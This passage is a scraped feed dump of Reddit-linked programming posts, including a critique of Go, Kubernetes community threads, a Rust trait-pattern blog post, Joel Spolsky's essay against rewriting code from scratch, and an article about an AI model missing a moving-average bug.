data-bo=\"20351\">And because there’s no way to “move” out of values, there has to be meaning for\nreceiving and sending to closed channels, too, because even after you close them\n<em>you can still interact with them</em>.</p><p data-bo=\"20549\">(Whereas in a language like Rust, a channel closes when its\n<a href=\"https://doc.rust-lang.org/stable/std/sync/mpsc/struct.Sender.html\">Sender</a> is\ndropped, which only happens when <em>nobody can touch it again, ever</em>. The same probably\napplies to C++ and a bunch of other languages, this is not new stuff).</p><p data-bo=\"20846\">“Zero values have meaning” is naive, and clearly untrue when you consider the\ninputs of, like… almost everything. There’s so many situations when values\nneed to be “one of these known options, and nothing else”, and that’s where\nsum types come in (in Rust, that’s <a href=\"https://fasterthanli.me/articles/peeking-inside-a-rust-enum\">enums</a>).</p><p data-bo=\"21161\">And Go’s response to that is: just be careful. Just like C’s response before it.</p><p data-bo=\"21243\">Just don’t access the return value if you haven’t checked the error value. Just\nhave a half-dozen people carefully review each trivial code change to make sure\nyou’re not accidentally propagating a nil, zero, or empty string way too deep\ninto your system.</p><p data-bo=\"21500\">It’s just another thing watch out for.</p><p data-bo=\"21540\">It’s not like you can prevent  problems anyway.</p><p data-bo=\"21761\">And you can write logic errors in just about every language! And if you try hard\nenough I’m sure you can drive a train straight into a tree! It’s just much\neasier with a car.</p><p data-bo=\"21937\">The fallacy here is that because it is impossible to solve , we\nshouldn’t even attempt to solve . By that same logic, it’s always\nworthless to support any individual financially, because it does nothing to help\nevery  individual who’s struggling.</p><p data-bo=\"22216\">And this is another self-defense tactic: to refuse to consider anything but the\nmost extreme version of a position, and point out how ridiculous it is (ignoring\nthe fact that nobody is actually defending that ridiculous, extreme position).</p><p data-bo=\"22457\">So let’s talk about that position.</p><a href=\"https://fasterthanli.me/articles/lies-we-tell-ourselves-to-keep-using-golang#rust-is-perfect-and-you-re-all-idiots\"><h2>“Rust is perfect and you’re all idiots”</h2></a><p data-bo=\"22537\">I  that was how I felt, because it would be so much simpler to explain.</p><p data-bo=\"22619\">That fantasy version of my argument is so easy to defeat, too. “How come you use\nLinux then? That’s written in C”. “Unsafe Rust is incredibly hard to write\ncorrectly, how do you feel about that?”</p><p data-bo=\"22816\">The success of Go is due in large part to it having batteries included and\nopinionated defaults.</p><p data-bo=\"22914\">The success of Rust is due in large part to it being easy to adopt piecemeal\nand .</p><p data-bo=\"23024\">They are both success stories, just very different ones.</p><p data-bo=\"23082\">If the boogeyman is to be believed, “Rust shills” would have everyone\nimmediately throw away everything, and replace it with The Only Good Language\nOut there.</p><p data-bo=\"23242\">This is  from what’s happening in the real world, it’s tragic.</p><p data-bo=\"23904\">None of these are without challenges, and none of the people involved are\ndenying said challenges. But all of these are incremental and pragmatic, very\nprogressively porting parts to a safer language .</p><p data-bo=\"24129\">We are very far from a “throwing the baby out with the bathwater” approach. The\nRust codegen backend  is a mountain of C++ code (LLVM).\nThe alternatives are not competitors by any stretch of the imagination, except\nmaybe for <a href=\"https://github.com/rust-lang/rustc_codegen_gcc\">another mountain of C++\ncode</a>.</p><p data-bo=\"24460\">The most hardcore Rust users are the most vocal about issues like build times,\nthe lack of certain language features (I just want\n<a href=\"https://blog.rust-lang.org/2021/08/03/GATs-stabilization-push.html\">GATs</a>!),\nand all the other shortcomings everyone else is also talking about.</p><p data-bo=\"24737\">And they’re also the first to be on the lookout for other, newer languages, that\ntackle the same kind of problems, but do it .</p><p data-bo=\"24878\">But as with the “questioning your credentials” angle, .\nThe current trends could be dangerous snake oil and we could have literally no\ndecent alternative, and <em>it would still be worth talking about</em>. No matter who\nraises the point!</p><p data-bo=\"25135\">Creating false dichotomies isn’t going to help resolve any of this.</p><p data-bo=\"25204\">Folks who develop an allergic reaction to “big balls of mutable state without\nsum types” tend to gravitate towards languages that gives them control over\nmutability, lifetimes, and lets them build abstractions. That those languages\nhappen to often be Go and Rust is immaterial. Sometimes it’s C and Haskell.\nSometimes it’s ECMAScript and Elixir. I can’t speak to those, but they do\nhappen.</p><p data-bo=\"25595\">You don’t have to choose between “going fast” and “modelling literally every\nlast detail of the problem space”. And you’re not stuck doing one or the other\nif you choose Go or Rust.</p><p data-bo=\"25778\">You can, at great cost, write extremely careful Go code that stays far away from\nstringly-typed values and constantly checks invariants — you just get no help\nfrom the compiler whatsoever.</p><p data-bo=\"25970\">And you can, fairly easily, decide not to care about a whole bunch of cases when\nwriting Rust code. For example, if you’re not writing a low-level command-line\nutility like , you can decide to only care about paths that are valid UTF-8\nstrings by using <a href=\"https://lib.rs/crates/camino\">camino</a>.</p><p data-bo=\"26271\">When handling errors, it is extremely common to list a few options we  care\nabout and want to do special handling for, and shove everything else into an\n“Other” or “Internal” or “Unknown” variant, which we can flesh out later as\nneeded, when reviewing logs.</p><p data-bo=\"26534\">The “correct” way to assume an optional value is set, is to ,\nnot to use it regardless. That’s the difference between calling \nand crossing your fingers, and calling\n<a href=\"https://doc.rust-lang.org/stable/std/option/enum.Option.html#method.unwrap\">unwrap()</a>\non an .</p><p data-bo=\"26842\">And it’s so much easier to do it correctly when the type system lets you spell\nout what the options are — even when it’s as simple as “ok” or “not ok”.</p><p data-bo=\"26997\">Which brings me to the next argument, by far the most reasonable of the bunch.</p><a href=\"https://fasterthanli.me/articles/lies-we-tell-ourselves-to-keep-using-golang#go-as-a-prototyping-starter-language\"><h2>Go as a prototyping/starter language</h2></a><p data-bo=\"27118\">We’ve reached the fifth stage of grief: acceptance.</p><p data-bo=\"27171\">. It may well be that Go is not adequate for production services unless\nyour shop is literally made up of Go experts (Tailscale) or you have infinite\nmoney to spend on engineering costs (Google).</p><p data-bo=\"27374\">But surely there’s still a place for it.</p><p data-bo=\"27416\">After all, Go is an easy language to pick up (because it’s so small, right?),\nand a lot of folks have learned it by now, so it’s easy to recruit Go\ndevelopers, so we can get lots of them on the cheap and just uhhh prototype a\nfew systems?</p><p data-bo=\"27656\">And then later when things get hard (as they always do at scale) we’ll either\nrewrite it to something else, or we’ll bring in experts, we’ll figure something\nout.</p><p data-bo=\"27820\">Except there is no such thing as throwaway code.</p><p data-bo=\"27870\">All engineering organizations I’ve ever seen are EXTREMELY rewrite-averse, and\nfor good reason! They take time, orchestrating a seamless transition is hard,\ndetails get lost in the shuffle, you’re not shipping new features while you’re\ndoing that, you have to retrain your staff to be effective at the new thing,\netc.</p><p data-bo=\"28189\">Tons of good, compelling reasons.</p><p data-bo=\"28224\">So very few things eventually end up being rewritten. And as more and more\ncomponents get written in Go, there’s more and more reason to  doing that:\nnot because it’s working particularly well for you, but because interacting with\nthe existing codebases from  is so painful (except over\nthe network, and even then.. see “Go is an island” above).</p><p data-bo=\"28602\">So things essentially never improve. All the Go pitfalls, all the things the\nlanguage and compiler , are an issue for everyone,\nfresh or experienced. Linters help some, but can never do quite as much as\ncompiler for languages that took these problems seriously to begin with. \nthey slow down development, cutting into the “fast development” promise.</p><p data-bo=\"28984\">All the complexity that doesn’t live in the language now lives in your codebase.\nAll the invariants you don’t have to spell out using types, you now have to\nspell out using code: the signal-to-noise ratio of your (very large) codebases\nis extremely poor.</p><p data-bo=\"29240\">Because it has been decided that abstractions are for academics and fools, and\nall you  need is slices and maps and channels and funcs and structs, it\nbecomes extremely hard to follow what any program is doing at a high level,\nbecause everywhere you look, you get bogged down in imperative code doing\ntrivial data manipulation or error propagation.</p><p data-bo=\"29598\">Because function signatures don’t tell you much of anything (does this mutate\ndata? does it hold onto it? is a zero value there okay? does it start a\ngoroutine? can that channel be nil? what types can I really pass for this\n param?), you rely on documentation, which is costly to update, and\ncostlier still  to update, resulting in more and more bugs.</p><p data-bo=\"29969\">The very reason I don’t consider Go a language “suitable for beginners” is\nprecisely that its compiler accepts so much code that is very clearly wrong.</p><p data-bo=\"30122\">It takes a lot of experience about everything  the language, everything\nGo willfully leaves as an exercise to the writer, to write semi-decent Go code,\nand even then, I consider it more effort than it’s worth.</p><p data-bo=\"30341\">The “worse is better” debate was never about some people wanting to feel\nsuperior by adding needless complexity, then mastering it.</p><p data-bo=\"30474\">Quite the contrary, it’s an admission that humans suck at maintaining\ninvariants. All of us. But we are capable of building tools that can help us\ndoing that. And focusing our efforts on that has an upfront cost, but that cost\nis well worth it.</p><p data-bo=\"30720\">I thought we’d moved past the notion that “programming is typing on a keyboard”\nlong ago, but when I keep reading “but it’s fast to write lots of Go!”, I’m not\nso sure.</p><p data-bo=\"30890\">Inherent complexity does not go away if you close your eyes.</p><p data-bo=\"30952\">When you choose not to care about complexity, you’re merely pushing it onto\nother developers in your org, ops people, your customers, . Now\n have to work around your assumptions to make sure everything keeps\nrunning smoothly.</p><p data-bo=\"31194\">And nowadays, I’m often that , and I’m tired of it.</p><p data-bo=\"31256\">Because there is a lot to like in Go at first, because it’s so easy to pick up,\nbut so hard to move away from, and because the cost of choosing it in the first\nplace reveals itself slowly over time, and compounds, only becoming unbearable\nwhen it’s much too late, this is not a discussion we can afford to ignore as an\nindustry.</p><p data-bo=\"31586\">Until we demand better of our tools, we are doomed to be woken up in the middle\nof the night, over and over again, because some  value slipped in where it\nnever should have.</p><div data-bo=\"31911\"><p data-bo=\"31924\">Here’s a list of lies we tell ourselves to keep using Golang:</p><ul><li>Others use it, so it must be good for us too</li><li>Everyone who has concerns about it is an elitist jerk</li><li>Its attractive async runtime and GC make up for everything else</li><li>Every language design flaw is ok in isolation, and ok in aggregate too</li><li>We can overcome these by “just being careful” or adding more linters/eyeballs</li><li>Because it’s easy to write, it’s easy to develop production software with</li><li>Because the language is simple, everything else is, too</li><li>We can do just a little of it, or just at first, or we can move away from it easily</li><li>We can always rewrite it later</li></ul></div><div data-context=\"end-of-page\">\n            (JavaScript is required to see this. Or maybe my stuff broke)\n        </div>","contentLength":27436,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://www.reddit.com/r/programming/comments/1loyyr1/lies_we_tell_ourselves_to_keep_using_golang/"},{"title":"Windows User Base Shrinks By 400 Million In Three Years","url":"https://www.reddit.com/r/linux/comments/1loy6zj/windows_user_base_shrinks_by_400_million_in_three/","date":1751365842,"author":"/u/Or0ch1m4ruh","guid":178872,"unread":true,"content":"   submitted by   <a href=\"https://www.reddit.com/user/Or0ch1m4ruh\"> /u/Or0ch1m4ruh </a>","contentLength":34,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"That Crossplane did not land. So... where to?","url":"https://www.reddit.com/r/kubernetes/comments/1loxvu2/that_crossplane_did_not_land_so_where_to/","date":1751364696,"author":"/u/IngwiePhoenix","guid":178897,"unread":true,"content":"<p>But this feedback paired with the Domino's provider () had me left wondering what other mechanisms are out there to \"unify\" resources.</p><p>...This requires a bit of explaining. I run a little homelab with three k3s nodes on Radxa Orion O6'es - super nice, although I don't have the full hw available, the compute is plenty, powerful and good! Alpine Linux is my base here - it just boots and works (in ACPI mode). But, I have a few auxiliary servers and services that are not kube'd; a FriendlyElec NANO3 that handles TVHeadend, a NAS that handles more complex services like Jellyfin, PaperlessNGX and Home Assistant, a secondary \"random crap that fits together\" NAS with an Athlon 3000G that runs Kasm on OpenMediaVault - and soon, I will have an AI server backed by LocalAI. That's a lot of potential API resources and I would love to take advantage of them. Probably not all of them, to be fair and honest. However, this is why I really liked the basic idea of Crossplane; I can use the HTTP provider to define CRUD ops and then use Kubernetes resources to manage and maintain them - kind of centralizing them, and perhaps opting into GitOps also (which I have not done yet entirely - my stuff  in a private Git repo but no ArgoCD is configured).</p><p>So... Since Crossplane hit such a nerve (oh my god the emotions were  xD) and OpenTofu seems absurdly overkill for a lil' homelab like this, what are some other \"orchestration\" or \"management\" tools that come to your mind?</p><p>I might still try CrossPlane, I might try Tekton at some point for CI/CD or see if I can make Concourse work... But it's a homelab, there's always something to explore. And, one of the things I would really like to get under control, is some form of central management of API-based resources.</p><p>So in other words; rather than the absolute moment that is the Crossplane post's comment section, throw out the things you liked to use in it's stead or something that you think would kinda go there!</p><p>And, thanks for the feedback on that post. Couldn've asked for a cleaner opinion at all. XD</p>","contentLength":2048,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"Monthly: Who is hiring?","url":"https://www.reddit.com/r/kubernetes/comments/1loxpea/monthly_who_is_hiring/","date":1751364035,"author":"/u/gctaylor","guid":178871,"unread":true,"content":"<div><p>This monthly post can be used to share Kubernetes-related job openings within  company. Please include:</p><ul><li>Location requirements (or lack thereof)</li><li>At least one of: a link to a job posting/application page or contact details</li></ul><p>If you are interested in a job, please contact the poster directly. </p><p>Common reasons for comment removal:</p><ul><li>Not meeting the above requirements</li><li>Recruiter post / recruiter listings</li><li>Negative, inflammatory, or abrasive tone</li></ul></div>   submitted by   <a href=\"https://www.reddit.com/user/gctaylor\"> /u/gctaylor </a>","contentLength":461,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"Weekly: Questions and advice","url":"https://www.reddit.com/r/kubernetes/comments/1loxpe3/weekly_questions_and_advice/","date":1751364034,"author":"/u/gctaylor","guid":179391,"unread":true,"content":"<p>Have any questions about Kubernetes, related tooling, or how to adopt or use Kubernetes? Ask away!</p>","contentLength":98,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"crd-to-sample-yaml now has an intellij and vscode plugin","url":"https://www.reddit.com/r/kubernetes/comments/1lox6m9/crdtosampleyaml_now_has_an_intellij_and_vscode/","date":1751361948,"author":"/u/skarlso","guid":178931,"unread":true,"content":"<p>I have a tool I wrote a while ago called <a href=\"https://github.com/Skarlso/crd-to-sample-yaml\">crd-to-sample-yaml</a> that does a bunch of things, but its main purpose is to be able to take anything that has an openAPI schema in it, and generate a valid YAML for it.</p><p>Now, I created a vscode and an intellij plugin for it. They are both registered and your can find them here: <a href=\"https://marketplace.visualstudio.com/items?itemName=GergelyBrautigam.crd-to-sample-yaml\">VSCode Extension</a> and here <a href=\"https://plugins.jetbrains.com/plugin/27800-crd-to-sample-yaml\">IntelliJ Plugin</a>. The intellij plugin is still under review officially, but you can also install it from the repository through File → Settings → Plugins → Install Plugin from Disk.</p><p>Enjoy, and if you find any problems, please don't hesitate to create an issue. :) Thank you so much for the great feedback and usage already.</p>","contentLength":670,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"Cross-Compiling 10,000+ Go CLI Packages Statically","url":"https://blog.pkgforge.dev/cross-compiling-10000-go-cli-packages-statically","date":1751361833,"author":"/u/Azathothas","guid":178900,"unread":true,"content":"","contentLength":0,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://www.reddit.com/r/golang/comments/1lox5lq/crosscompiling_10000_go_cli_packages_statically/"},{"title":"Linux managed to save me almost 50 gigs after a windows 11 install managed to somehow take up half my entire SSD.","url":"https://www.reddit.com/r/linux/comments/1lowp0y/linux_managed_to_save_me_almost_50_gigs_after_a/","date":1751359998,"author":"/u/gloombert","guid":178765,"unread":true,"content":"","contentLength":0,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"Alternative Blanket Implementations for a Single Rust Trait (blog post)","url":"https://www.greyblake.com/blog/alternative-blanket-implementations-for-single-rust-trait/","date":1751355159,"author":"/u/greyblake","guid":178793,"unread":true,"content":"<p>Rust's trait system is famously powerful - and famously strict about avoiding ambiguity.</p><p>One such rule is that <strong>you can't have multiple blanket implementations of the same trait</strong> that  apply to the same type.</p><h2>What Is a Blanket Implementation?</h2><p>A  is a trait implementation that applies to  type meeting certain constraints, typically via generics.</p><p>A classic example from the standard library is how <a rel=\"noopener\" target=\"_blank\" href=\"https://doc.rust-lang.org/std/convert/trait.From.html\"></a> and <a rel=\"noopener\" target=\"_blank\" href=\"https://doc.rust-lang.org/std/convert/trait.Into.html\"></a> work together:</p><pre data-lang=\"rust\"><code data-lang=\"rust\"></code></pre><p>Thanks to this, when you implement  for , you automatically get  for . Very ergonomic!</p><p>However, Rust enforces a key rule: <strong>no two blanket implementations may overlap</strong> - even . Consider:</p><pre data-lang=\"rust\"><code data-lang=\"rust\"></code></pre><p>Even if no type currently implements both  and , the compiler will reject this. The reason? Some type  satisfy both in the future, and that would make the implementation ambiguous.</p><p>While working on <a rel=\"noopener\" target=\"_blank\" href=\"https://github.com/greyblake/joydb\">Joydb</a>, I ran into this exact problem.</p><p>I have an <a rel=\"noopener\" target=\"_blank\" href=\"https://github.com/greyblake/joydb/blob/2aea9e11b1bc96e108e6c4478e599aaa587ffa8c/joydb/src/adapters/mod.rs#L50-L67\"></a> trait responsible for persisting data.</p><p>In practice, there are two common ways to implement it:</p><ul><li>A  that stores all data in a single file (e.g., JSON). In Joydb, this is <a rel=\"noopener\" target=\"_blank\" href=\"https://github.com/greyblake/joydb/blob/2aea9e11b1bc96e108e6c4478e599aaa587ffa8c/joydb/src/adapters/mod.rs#L107-L117\"></a>.</li><li>A  that stores each relation in a separate file (e.g., one CSV per relation), called <a rel=\"noopener\" target=\"_blank\" href=\"https://github.com/greyblake/joydb/blob/2aea9e11b1bc96e108e6c4478e599aaa587ffa8c/joydb/src/adapters/mod.rs#L119-L136\"></a>.</li></ul><p>Ideally, users would only need to implement one of those and get the  trait \"for free\".</p><p>But Rust won't let me define two conflicting blanket implementations. So... is there a workaround? 🤔</p><h2>The Trait Definitions in Joydb</h2><p>Here are the relevant traits in Joydb:</p><pre data-lang=\"rust\"><code data-lang=\"rust\"></code></pre><pre data-lang=\"rust\"><code data-lang=\"rust\"></code></pre><pre data-lang=\"rust\"><code data-lang=\"rust\"></code></pre><p>So the question becomes: <strong>how can I let someone implement either  or , and then get  automatically?</strong></p><h2>The Workaround: Associated Type + Marker Structs</h2><ol><li> like  and  to wrap adapter types.</li><li>A helper trait, , implemented for each marker type.</li><li>An  in the  trait to delegate behavior.</li></ol><pre data-lang=\"rust\"><code data-lang=\"rust\"></code></pre><p>These zero-sized types are used solely for type-level dispatch.</p><h3>Step 2: The  Trait</h3><pre data-lang=\"rust\"><code data-lang=\"rust\"></code></pre><pre data-lang=\"rust\"><code data-lang=\"rust\"></code></pre><p>Now we have <em>non-conflicting blanket impls</em> because they apply to  ( vs. ).</p><h3>Step 3: The  Trait with Associated Type</h3><pre data-lang=\"rust\"><code data-lang=\"rust\"></code></pre><p>The key piece: the associated type  tells  whether to delegate to  or .</p><p>Let's say we need to implement a  that writes everything to a single file.\nIt can be implemented as a :</p><pre data-lang=\"rust\"><code data-lang=\"rust\"></code></pre><p>No code duplication.\nNo conflicts.\nThe only overhead is 3 extra lines to link things together</p><p>This pattern - using <strong>marker types + associated types</strong> - gives you the flexibility of <em>alternative blanket implementations</em> while staying within Rust's coherence rules.</p><p>It's especially useful when you want to support mutually exclusive behaviors under a unified interface, without compromising on ergonomics.</p><h2>Psss! Are you looking for a passionate Rust dev?</h2><p>My friend is looking for a job in Berlin or remote.\nReach out to <a rel=\"noopener\" target=\"_blank\" href=\"https://www.linkedin.com/in/zekefast/\"></a>.</p>","contentLength":2497,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://www.reddit.com/r/rust/comments/1lovjej/alternative_blanket_implementations_for_a_single/"},{"title":"It’s harder to read code than to write it","url":"https://www.joelonsoftware.com/2000/04/06/things-you-should-never-do-part-i/","date":1751352712,"author":"/u/abooishaaq","guid":178933,"unread":true,"content":"<p>Netscape 6.0 is finally going into its first public beta. There never was a version 5.0. The last major release, version 4.0, was released almost three years ago. Three years is an  long time in the Internet world. During this time, Netscape sat by, helplessly, as their market share plummeted.</p><p>It’s a bit smarmy of me to criticize them for waiting so long between releases. They didn’t do it , now, did they?</p><p>Well, yes. They did. They did it by making the <b>single worst strategic mistake</b> that any software company can make:</p><p><img data-recalc-dims=\"1\" decoding=\"async\" hspace=\"4\" align=\"right\" src=\"https://i0.wp.com/www.joelonsoftware.com/wp-content/uploads/2000/04/Upper_West_Side_Brownstones_2.jpg?w=730&amp;ssl=1\">They decided to rewrite the code from scratch.</p><p>Netscape wasn’t the first company to make this mistake. Borland made the same mistake when they bought Arago and tried to make it into dBase for Windows, a doomed project that took so long that Microsoft Access ate their lunch, then they made it again in rewriting Quattro Pro from scratch and astonishing people with how few features it had. Microsoft almost made the same mistake, trying to rewrite Word for Windows from scratch in a doomed project called Pyramid which was shut down, thrown away, and swept under the rug. Lucky for Microsoft, they had never stopped working on the old code base, so they had something to ship, making it merely a financial disaster, not a strategic one.</p><p>We’re programmers. Programmers are, in their hearts, architects, and the first thing they want to do when they get to a site is to bulldoze the place flat and build something grand. We’re not excited by incremental renovation: tinkering, improving, planting flower beds.</p><p>There’s a subtle reason that programmers always want to throw away the code and start over. The reason is that they think the old code is a mess. And here is the interesting observation:  The reason that they think the old code is a mess is because of a cardinal, fundamental law of programming:</p><p>It’s harder to read code than to write it.</p><p>This is why code reuse is so hard. This is why everybody on your team has a different function they like to use for splitting strings into arrays of strings. They write their own function because it’s easier and more fun than figuring out how the old function works.</p><p><img data-recalc-dims=\"1\" decoding=\"async\" hspace=\"4\" align=\"left\" src=\"https://i0.wp.com/www.joelonsoftware.com/wp-content/uploads/2000/04/Columbus_Ave_Barber_Shop.jpg?w=730&amp;ssl=1\">As a corollary of this axiom, you can ask almost any programmer today about the code they are working on. “It’s a big hairy mess,” they will tell you. “I’d like nothing better than to throw it out and start over.”</p><p>“Well,” they say, “look at this function. It is two pages long! None of this stuff belongs in there! I don’t know what half of these API calls are for.” </p><p>Before Borland’s new spreadsheet for Windows shipped, Philippe Kahn, the colorful founder of Borland, was quoted a lot in the press bragging about how Quattro Pro would be much better than Microsoft Excel, because it was written from scratch. All new source code! As if source code .</p><p>The idea that new code is better than old is patently absurd. Old code has been . It has been .  of bugs have been found, and they’ve been . There’s nothing wrong with it. It doesn’t acquire bugs just by sitting around on your hard drive. Au contraire, baby! Is software supposed to be like an old Dodge Dart, that rusts just sitting in the garage? Is software like a teddy bear that’s kind of gross if it’s not made out of ?</p><p>Back to that two page function. Yes, I know, it’s just a simple function to display a window, but it has grown little hairs and stuff on it and nobody knows why. Well, I’ll tell you why: those are bug fixes. One of them fixes that bug that Nancy had when she tried to install the thing on a computer that didn’t have Internet Explorer. Another one fixes that bug that occurs in low memory conditions. Another one fixes that bug that occurred when the file is on a floppy disk and the user yanks out the disk in the middle. That LoadLibrary call is ugly but it makes the code work on old versions of Windows 95.</p><p>Each of these bugs took weeks of real-world usage before they were found. The programmer might have spent a couple of days reproducing the bug in the lab and fixing it. If it’s like a lot of bugs, the fix might be one line of code, or it might even be a couple of characters, but a lot of work and time went into those two characters.</p><p>When you throw away code and start from scratch, you are throwing away all that knowledge. All those collected bug fixes. Years of programming work.</p><p>You are throwing away your market leadership. You are giving a gift of two or three years to your competitors, and believe me, that is a  time in software years.</p><p>You are putting yourself in an extremely dangerous position where you will be shipping an old version of the code for several years, completely unable to make any strategic changes or react to new features that the market demands, because you don’t have shippable code. You might as well just close for business for the duration.</p><p>You are wasting an outlandish amount of money writing code that already exists.</p><p>Is there an alternative? The consensus seems to be that the old Netscape code base was bad. Well, it might have been bad, but, you know what? It worked pretty darn well on an awful lot of real world computer systems.</p><p>When programmers say that their code is a holy mess (as they always do), there are three kinds of things that are wrong with it.</p><p>First, there are architectural problems. The code is not factored correctly. The networking code is popping up its own dialog boxes from the middle of nowhere; this should have been handled in the UI code. These problems can be solved, one at a time, by carefully moving code, refactoring, changing interfaces. They can be done by one programmer working carefully and checking in his changes all at once, so that nobody else is disrupted. Even fairly major architectural changes can be done without . On the Juno project we spent several months rearchitecting at one point: just moving things around, cleaning them up, creating base classes that made sense, and creating sharp interfaces between the modules. But we did it carefully, with our existing code base, and we didn’t introduce new bugs or throw away working code.</p><p>A second reason programmers think that their code is a mess is that it is inefficient. The rendering code in Netscape was rumored to be slow. But this only affects a small part of the project, which you can optimize or even rewrite. You don’t have to rewrite the whole thing. When optimizing for speed, 1% of the work gets you 99% of the bang.</p><p>Third, the code may be doggone ugly. One project I worked on actually had a data type called a FuckedString. Another project had started out using the convention of starting member variables with an underscore, but later switched to the more standard “m_”. So half the functions started with “_” and half with “m_”, which looked ugly. Frankly, this is the kind of thing you solve in five minutes with a macro in Emacs, not by starting from scratch.</p><p>It’s important to remember that when you start from scratch there is  to believe that you are going to do a better job than you did the first time. First of all, you probably don’t even have the same programming team that worked on version one, so you don’t actually have “more experience”. You’re just going to make most of the old mistakes again, and introduce some new problems that weren’t in the original version. </p><p><img data-recalc-dims=\"1\" decoding=\"async\" hspace=\"4\" align=\"left\" src=\"https://i0.wp.com/www.joelonsoftware.com/wp-content/uploads/2008/01/Lincoln_Center_Trees.jpg?w=730&amp;ssl=1\">The old mantra  is dangerous when applied to large scale commercial applications. If you are writing code experimentally, you may want to rip up the function you wrote last week when you think of a better algorithm. That’s fine. You may want to refactor a class to make it easier to use. That’s fine, too. But throwing away the whole program is a dangerous folly, and if Netscape actually had some adult supervision with software industry experience, they might not have shot themselves in the foot so badly.</p>","contentLength":7843,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://www.reddit.com/r/programming/comments/1loux7h/its_harder_to_read_code_than_to_write_it/"},{"title":"I want to build a TUI-based game (player movement, collisions, basic enemies). Is Go a good choice?","url":"https://www.reddit.com/r/golang/comments/1louv5a/i_want_to_build_a_tuibased_game_player_movement/","date":1751352489,"author":"/u/Feldspar_of_sun","guid":178764,"unread":true,"content":"<p>I had a silly idea to make an extreme demake of one of my favorite games (Ikachan) with an ASCII art style. I thought it would be fun to make it purely as a TUI </p><p>Is Go a good choice for this? I have a little experience with it and have enjoyed what I’ve done so far, but I also have some experience in C/C++ and Python, and I’m wondering if those may be better </p><p>If Go is a good choice, what package(s) would be best for something like this? If not, how come? And do you have a different recommendation?</p>","contentLength":504,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"This Is Why You Can't Trust AI to Review Your Mission-Critical Code","url":"https://medium.com/p/456c47ce7e81","date":1751351799,"author":"/u/goated_ivyleague2020","guid":178966,"unread":true,"content":"<div><h2>The Unspoken Dangers of Relying on Language Models</h2></div><p>AI makes it too easy to use too little brain power. And if I was lazy and careless, I would’ve paid the price.</p><p>My name is Austin Starks, and I’m building an app called NexusTrade.</p><p>NexusTrade is like if ChatGPT had a baby with Robinhood, who grew up to have a baby with QuantConnect. In short, it’s a platform that allows everybody to create, test, and deploy their own algorithmic trading strategies.</p><p>While exceptionally good at testing complex strategies that operate at open and close, the platform has a major flaw… if you want to test out an intraday strategy, you’re cooked. <a href=\"https://medium.com/p/f77652e42217\" rel=\"noopener\">I’m working diligently to fix this.</a></p><p>In a previous article, I described the different milestones with the implementation. For , my objective is to implement “intraday-ness” within my indicators for my platform. And, if you observe from the surface-level (i.e, using AI tools), you might assume it’s already implemented! In fact, <a href=\"https://github.com/austin-starks/ta-rs-improved/\" rel=\"noopener ugc nofollow\" target=\"_blank\">you can check it out yourself</a>, and see the ingenuity of my implementation.</p><p>And if I trusted the surface-level (i.e, the  AI tools on the planet), I would’ve proceeded with the WRONG implementation. Here’s how Claude Opus 4 outright failed me on a critical feature.</p><p>To implement my intraday indicators, the first step was seeing if the implementation for it that exists is correct. To do this, I asked Claude the following:</p><blockquote><p>What do you think of this implementation? Is it correct? Any edge cases?</p></blockquote><p>For our overly ambitious engineering reader, here’s the implementation of the Simple Moving Average. See if you can spot the bug yourself.</p><p>The way this implementation works is by taking a Duration as the input. This parameter helps us maintain a sliding window and works for any period — 30 days, 30 minutes, or even 30 seconds.</p><p>At the surface, the implementation looks correct. Even Claude Opus 4, the most powerful coding LLM of our time, only pointed out nitpicks and unrealistic edge cases.</p><p>However, <strong>solely because I implemented the technical indicator library,</strong> I knew that there existed a hidden weakness. Allow me to explain.</p><p>On the surface level, the implementation of the intraday indicator looks sound. And it is!</p><p>If you make the following assumption: <strong>the data is ingested at regular intervals.</strong></p><p>Take this graph for example. It will correctly compute the 14-day SMA across Apple’s closed price because we’re assuming one data-point per day. But what happens if that assumption is violated?</p><p>Let’s say we “warmed up” our indicators using open/close data (i.e, computed our moving averages), and now we’re running our backtest on intraday data, which requires ingesting new data points at the minutely granularity.</p><p><strong>If we use the current implementation of the indicator, that introduces a major bug.</strong></p><p>This graph shows the impact of ingesting just 4 minutes of minutely data into our system. The SMA shoots up rapidly, approaching the current price of Apple.</p><p>The current implementation  that each ingested data point should be weighted the same as every other datapoint in the window. This is wrong!</p><p>In reality, we need to implement a time-weighted moving average. After some immense brainpower, I ended up developing the following algorithm.</p><p>This new implementation is an improvement over the original because:</p><ul><li>It should regress to the original implementation if we’re just ingesting open and closed data</li><li>It automatically resets the minutely averages at the start of the day for stocks</li><li>It maintains the minutely averages for cryptocurrency, which is tradeable all day</li></ul><p>Our unchecked assumption would’ve caused a major bug in such a critical feature. What can we learn from this?</p><p>I’m sharing this story for really one reason: as a cautionary tale for tech executives and software engineers.</p><p>And this should go without saying, but I am not some anti-AI evangelist. I literally developed a no-code, AI-Powered trading platform. If there’s anybody having sermons about the power and value of AI, it would be me!</p><p>But this article clearly demonstrates something immensely important: you can ask the literal best AI models of our time point blank if an implementation is wrong, and it will tell you no.</p><p>Now, this is not the model’s fault.  if I prompted it in such a way that listed every single assumption that can be made, then maybe it would’ve caught it!</p><p>But that’s not how people use AI in the real-world. I know it and you know it too.</p><p>For one, many assumptions that we make in software are implicit. We’re not even fully aware that we’re making them!</p><p>But also, just imagine if I didn’t even write the technical indicator library, and I trusted the authors to handle this automatically. Or, imagine if AI wrote the library entirely, and I never wondered about how it worked under the hood.</p><p>The implementation would’ve yielded outright incorrect values forever. Unless someone raised the issue because something seemed off, the bug would’ve laid dormant for months or even longer.</p><p>Debugging the issue would’ve been a nightmare on its own. I would’ve checked if the data was right or if the event emitter was firing correctly, and everything else within the core of the trading platform… I mean, why would I double-check the external libraries it depended on?</p><p>Catastrophically-silent bugs like this are going to become rampant. Not only do AI tools dramatically increase the output of engineers, but they are notoriously bad at understanding the 